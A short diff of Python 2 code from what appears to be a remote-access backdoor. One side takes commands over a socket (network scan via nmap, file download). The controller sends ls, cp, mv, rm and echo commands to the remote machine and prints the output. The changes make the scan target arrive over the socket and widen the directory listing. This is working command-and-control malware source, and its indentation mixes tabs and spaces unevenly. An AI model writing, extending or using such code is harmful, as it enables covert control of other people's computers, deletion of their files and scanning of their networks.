@@ -79,7 +79,8 @@ try:
                     except:
                           s.send('[!] File Not Found ..')
 		elif cmd[0:7] == 'netscan' and go==1:
-                    nmap(cmd[-1])
+			ip=s.recv(1024)
+			nmap(ip)
 		elif 'print' in cmd:
 			print(cmd[5:])
                 elif cmd == 'download':
@@ -189,7 +190,7 @@ def make_connection(host,port):
 					c.send("address")
 					print c.recv(1024)
 		     		elif ha[0:2] == "ls":
-					c.send('ls -l')
+					c.send('ls -lha')
 					print(c.recv(100000))
 		     		elif ha[0:2] == "cp" or ha[0:2] == "mv" or ha[0:2] == "rm" or ha[0:4] == "echo" :
 					c.send(ha)
